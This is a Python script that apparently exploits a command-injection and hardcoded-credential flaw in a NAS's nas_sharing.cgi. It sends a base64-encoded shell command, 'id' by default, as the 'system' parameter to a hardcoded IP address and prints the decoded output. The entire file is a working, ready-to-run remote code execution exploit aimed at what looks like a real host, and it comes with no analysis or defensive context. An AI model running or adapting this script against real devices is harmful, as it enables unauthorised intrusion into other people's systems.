import requests
import base64
import urllib3

urllib3.disable_warnings()

TARGETS = [
    "http://210.222.237.243:8080",
]

COMMAND = "id"

def run_exploit(url, cmd):
    print("[*] Target: " + url)
    b64_cmd = base64.b64encode(cmd.encode()).decode()
    uri = "/cgi-bin/nas_sharing.cgi?user=messagebus&passwd=&cmd=15&system=" + b64_cmd
    full_url = url.rstrip('/') + uri
    
    try:
        r = requests.get(full_url, headers={'User-Agent': 'Mozilla/5.0'}, timeout=10, verify=False)
        if r.status_code == 200:
            print("[+] Status 200")
            try:
                output = base64.b64decode(r.text).decode('utf-8', errors='replace')
                print("[+] Output:\n" + output)
            except:
                print("[?] Raw response:\n" + r.text[:300])
        else:
            print("[-] Status: " + str(r.status_code))
    except Exception as e:
        print("[-] Error: " + str(e))

for t in TARGETS:
    run_exploit(t, COMMAND)